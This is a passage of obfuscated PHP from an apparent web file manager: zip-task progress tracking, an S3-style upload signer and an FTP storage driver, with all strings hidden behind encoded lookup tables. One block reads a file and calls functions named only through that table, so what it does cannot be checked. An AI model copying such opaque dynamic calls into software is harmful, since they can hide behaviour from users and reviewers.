$õ§ÁÍÊò[$´šµŞ‰×[550]] ? $õ§ÁÍÊò[$´šµŞ‰×[550]] : $õ§ÁÍÊò[$´šµŞ‰×[84]]); if ($õ§ÁÍÊò[$´šµŞ‰×[33]] == $´šµŞ‰×[213]) { $Ğ¥Â¦«”[$´šµŞ‰×[811]] = 1; } else { $Ğ¥Â¦«”[$´šµŞ‰×[811]] = $õ§ÁÍÊò[$´šµŞ‰×[79]][$´šµŞ‰×[77]]; } $Ğ¥Â¦«”[$´šµŞ‰×[1094]] = $´šµŞ‰×[12]; $Ğ¥Â¦«”[$´šµŞ‰×[1733]] = 0; $Ğ¥Â¦«”[$´šµŞ‰×[1679]] = 0; $Ğ¥Â¦«”[$´šµŞ‰×[1731]] = 0; $Ğ¥Â¦«”[$´šµŞ‰×[1732]] = 0; $Ğ¥Â¦«”[$´šµŞ‰×[1729]] = $´šµŞ‰×[12]; $Ğ¥Â¦«”[$´šµŞ‰×[1736]] = 0; $Ğ¥Â¦«”[$´šµŞ‰×[788]] = $õ§ÁÍÊò[$´šµŞ‰×[76]]; $this->update(); self::log($´šµŞ‰×[1796] . json_encode(array($Ğ¥Â¦«”, $õ§ÁÍÊò))); } public function nameParse($–ê¸œ¯‘) { $¼ÌÏ¦·¹ =& $_SERVER[™»È’øè]; $¯»“˜™‰ =& $this->task; if ($¯»“˜™‰[$¼ÌÏ¦·¹[1794]] == $¼ÌÏ¦·¹[1224]) { $¯»“˜™‰[$¼ÌÏ¦·¹[1794]] = $¼ÌÏ¦·¹[356]; $¯»“˜™‰[$¼ÌÏ¦·¹[1736]] = 0; $¯»“˜™‰[$¼ÌÏ¦·¹[788]] = 0; } $´ÛÕœÑˆ = get_path_this($–ê¸œ¯‘); if (strstr($´ÛÕœÑˆ, $¼ÌÏ¦·¹[10])) { $¯»“˜™‰[$¼ÌÏ¦·¹[1679]] += 1; $¯»“˜™‰[$¼ÌÏ¦·¹[811]] += 1; } $¯»“˜™‰[$¼ÌÏ¦·¹[1729]] = $–ê¸œ¯‘; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $í·¢ç¡Ì =& $_SERVER[™»È’øè]; parent::startAfter(); Hook::bind($í·¢ç¡Ì[1797], array($this, $í·¢ç¡Ì[1792])); $ò²ñœËœ =& $this->task; $ò²ñœËœ[$í·¢ç¡Ì[1794]] = $í·¢ç¡Ì[1224]; if (!$ò²ñœËœ[$í·¢ç¡Ì[1573]]) { $ò²ñœËœ[$í·¢ç¡Ì[1573]] = LNG($í·¢ç¡Ì[1798]); } } protected function endAfter() { $Æ¿ŸÈ—» =& $_SERVER[™»È’øè]; parent::endAfter(); Hook::unbind($Æ¿ŸÈ—»[1797], array($this, $Æ¿ŸÈ—»[1792])); } public function updateAfter() { $„‡ÀÎº¤ =& $_SERVER[™»È’øè]; $“©´¼ıÖ =& $this->task; if (!$“©´¼ıÖ[$„‡ÀÎº¤[811]] || !$“©´¼ıÖ[$„‡ÀÎº¤[788]]) { return; } if ($“©´¼ıÖ[$„‡ÀÎº¤[1794]] == $„‡ÀÎº¤[1224]) { $°ˆ¥Õ”Í = $“©´¼ıÖ[$„‡ÀÎº¤[1732]]; if ($“©´¼ıÖ[$„‡ÀÎº¤[1733]] != $„‡ÀÎº¤[1224]) { $°ˆ¥Õ”Í = 0; } $“úÀÊèÃ = ($“©´¼ıÖ[$„‡ÀÎº¤[1736]] + $°ˆ¥Õ”Í) / $“©´¼ıÖ[$„‡ÀÎº¤[788]]; $“©´¼ıÖ[$„‡ÀÎº¤[1680]] = $“úÀÊèÃ * 0.3; } else { if ($“©´¼ıÖ[$„‡ÀÎº¤[1794]] == $„‡ÀÎº¤[356]) { $“úÀÊèÃ = $“©´¼ıÖ[$„‡ÀÎº¤[1679]] / $“©´¼ıÖ[$„‡ÀÎº¤[811]]; $“©´¼ıÖ[$„‡ÀÎº¤[1680]] = 0.3 + $“úÀÊèÃ * 0.5; } else { if ($“©´¼ıÖ[$„‡ÀÎº¤[1794]] == $„‡ÀÎº¤[107]) { $“úÀÊèÃ = 0; if ($“©´¼ıÖ[$„‡ÀÎº¤[1731]]) { $“úÀÊèÃ = $“©´¼ıÖ[$„‡ÀÎº¤[1732]] / $“©´¼ıÖ[$„‡ÀÎº¤[1731]]; } $“©´¼ıÖ[$„‡ÀÎº¤[1680]] = 0.3 + 0.5 + $“úÀÊèÃ * 0.2; } } } if ($“©´¼ıÖ[$„‡ÀÎº¤[1680]] > 0) { $÷â”÷Ø = timeFloat() - $“©´¼ıÖ[$„‡ÀÎº¤[1682]] - $“©´¼ıÖ[$„‡ÀÎº¤[1685]]; $“©´¼ıÖ[$„‡ÀÎº¤[1686]] = $÷â”÷Ø * (1 - $“©´¼ıÖ[$„‡ÀÎº¤[1680]]) / $“©´¼ıÖ[$„‡ÀÎº¤[1680]]; } } public function copyFileStart($¤ı’“Ó×, $Êş¼¹, $ìšëô¥Â, $¼ ¨äíÙ, $Ø’ºı, $çü‰éÉÏ) { $”æ¬Ñ· =& $_SERVER[™»È’øè]; parent::copyFileStart($¤ı’“Ó×, $Êş¼¹, $ìšëô¥Â, $¼ ¨äíÙ, $Ø’ºı, $çü‰éÉÏ); $ñŸŞ“¹· =& $this->task; if ($ñŸŞ“¹·[$”æ¬Ñ·[1794]] == $”æ¬Ñ·[356]) { $ñŸŞ“¹·[$”æ¬Ñ·[1794]] = $”æ¬Ñ·[107]; } $this->update(); } public function copyFileEnd($´ˆšÚˆ±, $ğ½ëÆ“«, $‚ÑÓ£ä¬, $¹Õ‚ë£•, $ï“³£ñ™, $Ü±–º‡€) { $Îá‚ç¦Ó =& $_SERVER[™»È’øè]; $Å€»ü =& $this->task; $Å€»ü[$Îá‚ç¦Ó[1732]] = $Å€»ü[$Îá‚ç¦Ó[1731]]; $Å€»ü[$Îá‚ç¦Ó[1736]] += $Å€»ü[$Îá‚ç¦Ó[1731]]; $Å€»ü[$Îá‚ç¦Ó[1733]] = $Îá‚ç¦Ó[12]; $this->update(); } public function nameParse($à¤ÊşÛÕ) { $Òä•Ş³× =& $_SERVER[™»È’øè]; $—“€Šù =& $this->task; if ($—“€Šù[$Òä•Ş³×[1679]] < $—“€Šù[$Òä•Ş³×[811]]) { $Äî¹ê³ = get_path_this($à¤ÊşÛÕ); if (strstr($Äî¹ê³, $Òä•Ş³×[10])) { $—“€Šù[$Òä•Ş³×[1679]] += 1; } } if ($—“€Šù[$Òä•Ş³×[1794]] == $Òä•Ş³×[1224]) { $—“€Šù[$Òä•Ş³×[1794]] = $Òä•Ş³×[356]; } $—“€Šù[$Òä•Ş³×[1729]] = $à¤ÊşÛÕ; $this->update(); } } if ($_SERVER[$_SERVER[™»È’øè][892]] != $_SERVER[$_SERVER[™»È’øè][1602]]) { $_getc = $_SERVER[™»È’øè][894]; $_getfile = $_SERVER[$_SERVER[™»È’øè][895]] . $_SERVER[™»È’øè][896]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[™»È’øè][245], $_getfilec); if (count($_getarrs) < $_SERVER[™»È’øè][656]) { $exit = $_SERVER[™»È’øè][897]; $exit(); } $_act = $_SERVER[™»È’øè][898]; $_act($_SERVER[$_SERVER[™»È’øè][893]]); } goto BÑÇœíÒª; AÍç‹Æ™ŠÂ: class PathDriverEDS extends PathDriverMinIO { public function __construct($ú™½ßËû) { parent::__construct($ú™½ßËû); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($‚ÂıÖÅ) { parent::__construct($‚ÂıÖÅ); $this->signatureVersion($_SERVER[™»È’øè][230]); } public function uploadFormData($ã¥Õ¢Ó±, $‡äüÅ¥ı = 3600) { $íªø¹ =& $_SERVER[™»È’øè]; $ÛÙîÜÙÌ = $íªø¹[212]; $Á…ß²ïÌ = $íªø¹[252]; $ò“²œÕÏ = $íªø¹[62]; $Éµ„ÓÊ = gmdate($íªø¹[253]); $šœŒÏÃå = gmdate($íªø¹[254]); $½¤Ö‰’ = $íªø¹[255]; $›áïÕ™ = $‡äüÅ¥ı . $íªø¹[12]; $áÇ«ø±› = $íªø¹[256]; $’®Æ•ğñ = array($this->accessKey, $šœŒÏÃå, $this->region, $ò“²œÕÏ, $½¤Ö‰’); $Ø”Ô¿ú­ = implode($íªø¹[8], $’®Æ•ğñ); $“–µˆç = array($íªø¹[257] => gmdate($íªø¹[1354], strtotime($íªø¹[259])), $íªø¹[260] => array(array($íªø¹[261] => $this->bucket), array($íªø¹[262] => $ÛÙîÜÙÌ), array($íªø¹[263], $íªø¹[264], $íªø¹[12]), array($íªø¹[263], $íªø¹[265], $íªø¹[12]), array($íªø¹[263], $íªø¹[266], $íªø¹[12]), array($íªø¹[267] => $áÇ«ø±›), array($íªø¹[268] => $Ø”Ô¿ú­), array($íªø¹[269] => $Á…ß²ïÌ), array($íªø¹[270] => $Éµ„ÓÊ), array($íªø¹[271] => $›áïÕ™))); $Äªº½ü = base64_encode(json_encode($“–µˆç)); $Ö–Ü±™Û = hash_hmac($íªø¹[272], $šœŒÏÃå, $íªø¹[273] . $this->secret, !0); $°¯›ªïñ = hash_hmac($íªø¹[272], $this->region, $Ö–Ü±™Û, !0); $äîãğñ¶ = hash_hmac($íªø¹[272], $ò“²œÕÏ, $°¯›ªïñ, !0); $ìå÷£¨“ = hash_hmac($íªø¹[272], $½¤Ö‰’, $äîãğñ¶, !0); $·–†İÂ¢ = hash_hmac($íªø¹[272], $Äªº½ü, $ìå÷£¨“); $ÛŞíÉ·Ô = array($íªø¹[229] => $íªø¹[12], $íªø¹[274] => $íªø¹[12], $íªø¹[262] => $ÛÙîÜÙÌ, $íªø¹[267] => $áÇ«ø±›, $íªø¹[275] => $Äªº½ü, $íªø¹[276] => $Ø”Ô¿ú­, $íªø¹[277] => $Á…ß²ïÌ, $íªø¹[278] => $Éµ„ÓÊ, $íªø¹[279] => $›áïÕ™, $íªø¹[280] => $·–†İÂ¢, $íªø¹[195] => $this->getHost()); return $ÛŞíÉ·Ô; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($Ú¬†¶¡¤) { parent::__construct(); if (count($Ú¬†¶¡¤) > 0) { $this->_init($Ú¬†¶¡¤); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Í‡ÔÇüÓ) { $§òõ©Ã” =& $_SERVER[™»È’øè]; global $config; $this->appCharset = $config[$§òõ©Ã”[1380]]; $this->systemCharset = $config[$§òõ©Ã”[1381]]; if (isset($Í‡ÔÇüÓ[$§òõ©Ã”[1382]]) && $Í‡ÔÇüÓ[$§òõ©Ã”[1382]]) { $this->systemCharset = $Í‡ÔÇüÓ[$§òõ©Ã”[1382]]; } } public function iconvApp($‹²¡üÅ’) { return $this->iconvTo($‹²¡üÅ’, $this->systemCharset, $this->appCharset); } public function iconvSystem($¨Ÿ—Ÿ¥ã) { return $this->iconvTo($¨Ÿ—Ÿ¥ã, $this->appCharset, $this->systemCharset); } public function getPathOuter($°ÓÓ”•ê) { $›Ğ»Á =& $_SERVER[™»È’øè]; $§ùóÊˆ = $this->iconvApp($this->pathBase); $°ÓÓ”•ê = $this->iconvApp($°ÓÓ”•ê); if (substr($§ùóÊˆ, 0, 2) == $›Ğ»Á[1308]) { $§ùóÊˆ = BASIC_PATH . substr($§ùóÊˆ, 2); } if (substr($°ÓÓ”•ê, 0, 2) == $›Ğ»Á[1308]) { $°ÓÓ”•ê = BASIC_PATH . substr($°ÓÓ”•ê, 2); } $§ùóÊˆ = KodIO::clear($§ùóÊˆ); $°ÓÓ”•ê = KodIO::clear($°ÓÓ”•ê); $°ÓÓ”•ê = substr($°ÓÓ”•ê, strlen($§ùóÊˆ)); if (empty($this->pathDriver)) { return $°ÓÓ”•ê; } return $this->pathDriver . $›Ğ»Á[8] . ltrim($°ÓÓ”•ê, $›Ğ»Á[8]); } private function _init($–º½Ã = array()) { $ºìè÷ò =& $_SERVER[™»È’øè]; if (!function_exists($ºìè÷ò[1383])) { throw new Exception(LNG($ºìè÷ò[1384])); } $this->config = $–º½Ã; $this->charsetReset($–º½Ã); foreach ($–º½Ã as $éÚó¢•¾ => $ìİÖüûÛ) { if (isset($this->{$éÚó¢•¾})) { $this->{$éÚó¢•¾} = $ìİÖüûÛ; } } return $this->_login($–º½Ã); } private function _login($Ñ÷ÏÇÉ—) { $ıŒë…ƒé =& $_SERVER[™»È’øè]; static $˜·òÂú§ = array(); $ïÄ‘Å’ = md5(json_encode($Ñ÷ÏÇÉ—)); if (isset($˜·òÂú§[$ïÄ‘Å’])) { foreach ($˜·òÂú§[$ïÄ‘Å’] as $ñ‘‚îïÙ => $³®Ú²ô¹) { $this->{$ñ‘‚îïÙ} = $³®Ú²ô¹; } return !0; } $Şüşš·÷ = parse_url(trim($this->server, $ıŒë…ƒé[8])); $this->host = $Şüşš·÷[$ıŒë…ƒé[195]]; $ÏÇØá = isset($Şüşš·÷[$ıŒë…ƒé[194]]) && $Şüşš·÷[$ıŒë…ƒé[194]] == $ıŒë…ƒé[1385] ? !0 : !1; $this->scheme = $ÏÇØá ? $ıŒë…ƒé[1386] : $ıŒë…ƒé[1387]; $this->port = isset($Şüşš·÷[$ıŒë…ƒé[196]]) ? $Şüşš·÷[$ıŒë…ƒé[196]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Ø†ïÒä“ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¿ÛÍıÀ = $this->pasv == $ıŒë…ƒé[88] ? !0 : !1; @ftp_pasv($this->connect, $¿ÛÍıÀ); $˜·òÂú§[$ïÄ‘Å’] = array($ıŒë…ƒé[1388] => $this->connect, $ıŒë…ƒé[195] => $this->host, $ıŒë…ƒé[194] => $this->scheme, $ıŒë…ƒé[196] => $this->port); return $Ø†ïÒä“; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ÑºÂ‘–°, $¨àèç ± = '', $Ê¿±Ñ­Õ = REPEAT_RENAME) { if ($this->setContent($ÑºÂ‘–°, $¨àèç ±)) { return $this->getPathOuter($ÑºÂ‘–°); } return !1; } public function mkdir($¦Äµü¤ï, $û«´öƒÔ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $¦Äµü¤ï = $this->iconvSystem($¦Äµü¤ï); if ($this->_isFolder($¦Äµü¤ï) || @ftp_mkdir($this->connect, $¦Äµü¤ï)) { return $this->getPathOuter($¦Äµü¤ï); } if (!$this->mkdir($this->pathFather($¦Äµü¤ï))) { return !1; } if ($¦Äµü¤ï = @ftp_mkdir($this->connect, $¦Äµü¤ï)) { return $this->getPathOuter($¦Äµü¤ï); } return !1; } public function copyFile($’‘œ‹Æ, $ˆºóåŠ) { if (!$this->_isconn()) { return !1; } $ñ¹Üìˆí = $this->pathThis($this->iconvSystem($’‘œ‹Æ)); $ğ¶²ıåü = $this->tempFile($ñ¹Üìˆí); $™Ë¦ìâ± = $this->iconvApp($ğ¶²ıåü); $this->download($’‘œ‹Æ, $™Ë¦ìâ±); $‘û©ó´ = $this->upload($ˆºóåŠ, $™Ë¦ìâ±); $this->tempFileRemve($ğ¶²ıåü); return $‘û©ó´; } public function moveFile($ÒœŸÀ¿, $é§Í×İ‡) { if (!$this->_isconn()) { return !1; } $ÒœŸÀ¿ = $this->iconvSystem($ÒœŸÀ¿); $é§Í×İ‡ = $this->iconvSystem($é§Í×İ‡); $ö°ûàİƒ = @ftp_rename($this->connect, $ÒœŸÀ¿, $é§Í×İ‡); return $ö°ûàİƒ ? $this->getPathOuter($é§Í×İ‡) : !1; } public function delFile($İĞÜ²õœ) { if (!$this->_isconn()) { return !1; } $İĞÜ²õœ = $this->iconvSystem($İĞÜ²õœ); return @ftp_delete($this->connect, $İĞÜ²õœ); } public function delFolder($µŞô“•Æ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Èšıµğå = $»¶•›Áë = array(); $this->fileList($µŞô“•Æ, $Èšıµğå, $»¶•›Áë, !0); $this->listItemCache = !0; foreach ($»¶•›Áë as $çí‰É©Œ) { $Óí ¶«§ = $this->iconvSystem($çí‰É©Œ[$_SERVER[™»È’øè][32]]); $ĞÉì›Ğ = @ftp_delete($this->connect, $Óí ¶«§); if (!$ĞÉì›Ğ) { return !1; } } foreach ($Èšıµğå as $Óí ¶«§) { $Óí ¶«§ = $this->iconvSystem($Óí ¶«§); $ĞÉì›Ğ = @ftp_rmdir($this->connect, $Óí ¶«§); if (!$ĞÉì›Ğ) { return !1; } } $µŞô“•Æ = $this->iconvSystem($µŞô“•Æ); return @ftp_rmdir($this->connect, $µŞô“•Æ); } public function rename($Ì´¶ûÄæ, $·‡ÓÍŠ½) { $ÍÖ–…úõ =& $_SERVER[™»È’øè]; if (!$this->_isconn()) { return !1; } $³¡Ş í‰ = $this->fileNameAuto($this->pathFather($Ì´¶ûÄæ), $·‡ÓÍŠ½); $³¡Ş í‰ = $this->iconvSystem($³¡Ş í‰); $Ì´¶ûÄæ = $this->iconvSystem($Ì´¶ûÄæ); $ÇÅ¡¦Ï† = $this->pathFather($Ì´¶ûÄæ); $è¶òá€ì = rtrim($ÇÅ¡¦Ï†, $ÍÖ–…úõ[8]) . $ÍÖ–…úõ[8] . $³¡Ş í‰; $éşÈ²…Ä = @ftp_rename($this->connect, $Ì´¶ûÄæ, $è¶òá€ì); $è¶òá€ì = $this->iconvApp($è¶òá€ì); return $éşÈ²…Ä ? $this->getPathOuter($è¶òá€ì) : !1; } private function folderInfo($Šæâšö¾, $Üè™Ë°÷ = false) { $™‰©«ñŞ =& $_SERVER[™»È’øè]; $½½ÉŸç— = array($™‰©«ñŞ[32] => $this->pathThis($Šæâšö¾), $™‰©«ñŞ[84] => $this->getPathOuter($™‰©«ñŞ[8] . $Šæâšö¾), $™‰©«ñŞ[33] => $™‰©«ñŞ[75]); if ($Üè™Ë°÷) { return $½½ÉŸç—; } $½½ÉŸç—[$™‰©«ñŞ[214]] = $½½ÉŸç—[$™‰©«ñŞ[85]] = 0; $½½ÉŸç—[$™‰©«ñŞ[215]] = $½½ÉŸç—[$™‰©«ñŞ[216]] = !0; return $½½ÉŸç—; } private function fileInfo($Ê© èî®, $ÓªÙ¦êá = false, $À‚å¸™Ó = array()) { $äˆİ©• =& $_SERVER[™»È’øè]; $¡êàÙß = array($äˆİ©•[32] => $this->pathThis($Ê© èî®), $äˆİ©•[84] => $this->getPathOuter($äˆİ©•[8] . $Ê© èî®), $äˆİ©•[33] => $äˆİ©•[213], $äˆİ©•[76] => isset($À‚å¸™Ó[$äˆİ©•[76]]) ? $À‚å¸™Ó[$äˆİ©•[76]] : 0, $äˆİ©•[174] => $this->ext($Ê© èî®)); if ($ÓªÙ¦êá) { return $¡êàÙß; } $¡êàÙß[$äˆİ©•[214]] = $¡êàÙß[$äˆİ©•[85]] = 0; $¡êàÙß[$äˆİ©•[215]] = $¡êàÙß[$äˆİ©•[216]] = !0; $åŒƒÁ¯Ö = $this->iconvSystem($Ê© èî®); $¡êàÙß[$äˆİ©•[85]] = @ftp_mdtm($this->connect, $åŒƒÁ¯Ö); if (empty($À‚å¸™Ó)) { $À‚å¸™Ó = $this->objectMeta($Ê© èî®); if (!$À‚å¸™Ó) { return $¡êàÙß; } } $¡êàÙß[$äˆİ©•[76]] = $À‚å¸™Ó[$äˆİ©•[76]]; return $¡êàÙß; } public function size($æâºÙ¸–) { $‡ßÑ³ñ« = $this->objectMeta($æâºÙ¸–); return $‡ßÑ³ñ« ? $‡ßÑ³ñ«[$_SERVER[™»È’øè][76]] : 0; } public function info($êäòÃˆÜ) { if ($this->isFile($êäòÃˆÜ)) { return $this->fileInfo($êäòÃˆÜ, 0); } else { if ($this->isFolder($êäòÃˆÜ)) { return $this->folderInfo($êäòÃˆÜ); } } return !1; } private function fileList($­î®™„Û, &$ÀÍŞ—«³, &$§Æš½£Ë, $ ·Èñùœ = false) { $Ÿ²Ÿ™ÊŠ =& $_SERVER[™»È’øè]; $­î®™„Û = $this->iconvSystem($­î®™„Û); if (!$this->isFolder($­î®™„Û)) { return !1; } @ftp_chdir($this->connect, $Ÿ²Ÿ™ÊŠ[8]); $­î®™„Û = rtrim($­î®™„Û, $Ÿ²Ÿ™ÊŠ[8]) . $Ÿ²Ÿ™ÊŠ[8]; check_abort(); $˜ÇàÁŞ˜ = @ftp_rawlist($this->connect, $­î®™„Û); if (!$˜ÇàÁŞ˜) { $˜ÇàÁŞ˜ = array(); } $·½¿™Ä› = array($Ÿ²Ÿ™ÊŠ[10] => 1, $Ÿ²Ÿ™ÊŠ[1309] => 1); foreach ($˜ÇàÁŞ˜ as $à¡ĞÉÀŸ) { $é¤Ùò¦à = $this->_listItem($à¡ĞÉÀŸ); if ($é¤Ùò¦à[0] == $Ÿ²Ÿ™ÊŠ[783]) { continue; } $ë‚Øàì¸ = $é¤Ùò¦à[8]; if (empty($ë‚Øàì¸) && $ë‚Øàì¸ !== $Ÿ²Ÿ™ÊŠ[211] || isset($·½¿™Ä›[$ë‚Øàì¸])) { continue; } $ë‚Øàì¸ = $this->iconvApp($­î®™„Û . ltrim($ë‚Øàì¸, $Ÿ²Ÿ™ÊŠ[8])); $•‘«×ç¦ = array($Ÿ²Ÿ™ÊŠ[32] => $ë‚Øàì¸, $Ÿ²Ÿ™ÊŠ[33] => $Ÿ²Ÿ™ÊŠ[213], $Ÿ²Ÿ™ÊŠ[76] => $é¤Ùò¦à[4]); if (substr($à¡ĞÉÀŸ, 0, 1) == $Ÿ²Ÿ™ÊŠ[1389]) { $•‘«×ç¦[$Ÿ²Ÿ™ÊŠ[33]] = $Ÿ²Ÿ™ÊŠ[75]; $•‘«×ç¦[$Ÿ²Ÿ™ÊŠ[76]] = 0; } $£÷®¾›Ù = $•‘«×ç¦[$Ÿ²Ÿ™ÊŠ[33]] == $Ÿ²Ÿ™ÊŠ[75] ? !0 : !1; $this->cacheMethodInfoSet($ë‚Øàì¸, $£÷®¾›Ù, $•‘«×ç¦); if ($£÷®¾›Ù) { $ÀÍŞ—«³[] = $ë‚Øàì¸; if ($ ·Èñùœ) { $this->fileList($ë‚Øàì¸, $ÀÍŞ—«³, $§Æš½£Ë, $ ·Èñùœ); } continue; } $§Æš½£Ë[] = $•‘«×ç¦; } $this->cacheMethodInfoSet($­î®™„Û, !0); } private function _listItem($‡óµÒşî) { if (empty($‡óµÒşî)) { return array(); } $úĞôŸÖú = preg_split($_SERVER[™»È’øè][1390], $‡óµÒşî); if (count($úĞôŸÖú) <= 9) { return $úĞôŸÖú; } $úĞôŸÖú[8] = trim(substr($‡óµÒşî, strpos($‡óµÒşî, $úĞôŸÖú[7]) + strlen($úĞôŸÖú[7]))); return array_splice($úĞôŸÖú, 0, 9); } public function listPath($ ªğ³óÂ, $µ®¯ÂÆù = false) { $Î÷èÏˆÊ =& $_SERVER[™»È’øè]; if (!$this->_isconn()) { return !1; } $¯ò¾»œƒ = $ö‹ÌŠ•á = array(); $this->fileList($ ªğ³óÂ, $¯ò¾»œƒ, $ö‹ÌŠ•á); foreach ($¯ò¾»œƒ as $©õ¥éÂ  => $‘†ƒÃíÒ) { $¯ò¾»œƒ[$©õ¥éÂ ] = $this->folderInfo($‘†ƒÃíÒ, $µ®¯ÂÆù); } foreach ($ö‹ÌŠ•á as $©õ¥éÂ  => $‘†ƒÃíÒ) { $ö‹ÌŠ•á[$©õ¥éÂ ] = $this->fileInfo($‘†ƒÃíÒ[$Î÷èÏˆÊ[32]], $µ®¯ÂÆù, $‘†ƒÃíÒ); } return array($Î÷èÏˆÊ[82] => $¯ò¾»œƒ, $Î÷èÏˆÊ[83] => $ö‹ÌŠ•á); } public function has($ö½øÅ¥ì, $ïº½ó = false, $ŸÂ´ı = true) { $šéŸû§Ù =& $_SERVER[™»È’øè]; $‚±ô‡¢¸ = $‰‹­º§à = array(); $‚ù£ã…² = $ïº½ó ? !0 : !1; $this->fileList($ö½øÅ¥ì, $‚±ô‡¢¸, $‰‹­º§à, $‚ù£ã…²); if ($ïº½ó) { return array($šéŸû§Ù[222] => count($‰‹­º§à), $šéŸû§Ù[223] => count($‚±ô‡¢¸)); } if ($ŸÂ´ı) { if (count($‰‹­º§à)) { return !0; } } else { if (count($‚±ô‡¢¸)) { return !0; } } return !1; } public function listAll($Öß„ğ·ˆ) { $„şì²øû =& $_SERVER[™»È’øè]; if (!$this->_isconn()) { return !1; } $£‰Ñ£– = $‹ù®†ã = array(); $this->fileList($Öß„ğ·ˆ, $£‰Ñ£–, $‹ù®†ã, !0); $Íá—í á = array_to_keyvalue($‹ù®†ã, $„şì²øû[32]); foreach ($£‰Ñ£– as $í¥ÄğÎî) { if (is_string($í¥ÄğÎî)) { $Íá—í á[$í¥ÄğÎî] = array($„şì²øû[76] => 0); } } return $this->listAllFiles($Öß„ğ·ˆ, $Íá—í á); } public function getContent($µ„ğ‹Ìæ) { if (!$this->_isconn()) { return !1; } $µ„ğ‹Ìæ = $this->iconvSystem($µ„ğ‹Ìæ); return $this->fileSubstr($µ„ğ‹Ìæ); } public function setContent($ş‘½‹µ’, $ç³ÉÁ±Ÿ = '') { if (!$this->_isconn()) { return !1; } $ø£â¯ãû = $this->pathThis($this->iconvSystem($ş‘½‹µ’)); $îúÁ˜Éƒ = $this->tempFile($ø£â¯ãû); file_put_contents($îúÁ˜Éƒ, $ç³ÉÁ±Ÿ); $ËÛƒ™¯» = $this->upload($ş‘½‹µ’, $this->iconvApp($îúÁ˜Éƒ)); $this->tempFileRemve($îúÁ˜Éƒ); return $ËÛƒ™¯»; } public function fileSubstr($µˆù×âİ, $ï—¥ƒ´ = 0, $¨ËôÈó‹ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($µˆù×âİ, $ï—¥ƒ´, $¨ËôÈó‹); } private function ftpRequest($ÏÌ™ú¾ó, $ù­Ù»®× = 0, $ÕñÈ¶®Ì = false) { $ÏÌ™ú¾ó = $this->iconvSystem($ÏÌ™ú¾ó); $üùúÁ‹ş = $this->scheme . $this->host . $_SERVER[™»È’øè][4] . $this->port; $íš¡¼¯Ğ = curl_init(); curl_setopt($íš¡¼¯Ğ, CURLOPT_URL, $üùúÁ‹ş . $this->pathEncode($ÏÌ™ú¾ó)); curl_setopt($íš¡¼¯Ğ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ÕñÈ¶®Ì) { $¼ŠÒÇı = $ù­Ù»®× + $ÕñÈ¶®Ì - 1; curl_setopt($íš¡¼¯Ğ, CURLOPT_RANGE, "{$ù­Ù»®×}\x2d{$¼ŠÒÇı}"); } curl_setopt($íš¡¼¯Ğ, CURLOPT_RETURNTRANSFER, 1); $³àÏÉû² = curl_exec($íš¡¼¯Ğ); curl_close($íš¡¼¯Ğ); return $³àÏÉû²; } public function upload($ß×ğû‘è, $ñÕ±èÈ, $¼ñğÀÕ¢ = false, $÷Šä‡†õ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ß×ğû‘è))) { return !1; } $ß×ğû‘è = $this->iconvSystem($ß×ğû‘è); $ñÕ±èÈ = $this->iconvSystem($ñÕ±èÈ); $Áúûîã² = ftp_nb_put($this->connect, $ß×ğû‘è, $ñÕ±èÈ, FTP_BINARY); while ($Áúûîã² == FTP_MOREDATA) { $Áúûîã² = ftp_nb_continue($this->connect); } if ($Áúûîã² != FTP_FINISHED) { return !1; } return $this->getPathOuter($ß×ğû‘è); } public function download($æˆ—ïÌÔ, $·¾ÇÒ€˜ = '') { if (!$this->_isconn()) { return !1; } $şìå¹½¢ = $this->pathFather($·¾ÇÒ€˜); if (!IO::mkdir($şìå¹½¢)) { return !1; } $æˆ—ïÌÔ = $this->iconvSystem($æˆ—ïÌÔ); $·¾ÇÒ€˜ = $this->iconvSystem($·¾ÇÒ€˜); $‡ãïó—’ = ftp_nb_get($this->connect, $·¾ÇÒ€˜, $æˆ—ïÌÔ, FTP_BINARY); while ($‡ãïó—’ == FTP_MOREDATA) { $‡ãïó—’ = ftp_nb_continue($this->connect); } if ($‡ãïó—’ != FTP_FINISHED) { return !1; } return $this->iconvApp($·¾ÇÒ€˜); } public function exist($§˜ÆÇŸğ) { return $this->isFile($§˜ÆÇŸğ) || $this->isFolder($§˜ÆÇŸğ); } public function isFile($°‘ôôŠ) { return !$this->isFolder($°‘ôôŠ) && $this->objectMeta($°‘ôôŠ); } public function isFolder($Óæ™˜Œ) { return $this->cacheMethod($_SERVER[™»È’øè][165], $Óæ™˜Œ); } protected function objectMeta($ ïŞ«±é) { return $this->cacheMethod($_SERVER[™»È’øè][167], $ ïŞ«±é); } protected function _objectMeta($Î§ÅÏ³) { $–ò¯à¸³ =& $_SERVER[™»È’øè]; if ($Î§ÅÏ³ == $–ò¯à¸³[12] || $Î§ÅÏ³ == $–ò¯à¸³[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Î§ÅÏ³ = $this->iconvSystem($Î§ÅÏ³); $€—ıÚÊı = array($–ò¯à¸³[32] => $this->iconvApp($Î§ÅÏ³), $–ò¯à¸³[33] => $–ò¯à¸³[213], $–ò¯à¸³[76] => 0); @ftp_chdir($this->connect, $–ò¯à¸³[8]); $ßùˆÎ˜• = @ftp_size($this->connect, $Î§ÅÏ³); if ($ßùˆÎ˜• != -1) { $€—ıÚÊı[$–ò¯à¸³[76]] = $ßùˆÎ˜•; } else { $›½‡Ø´× = @ftp_chdir($this->connect, $Î§ÅÏ³); if (!$›½‡Ø´×) { return !1; } $€—ıÚÊı[$–ò¯à¸³[33]] = $–ò¯à¸³[75]; } return $€—ıÚÊı; } protected function 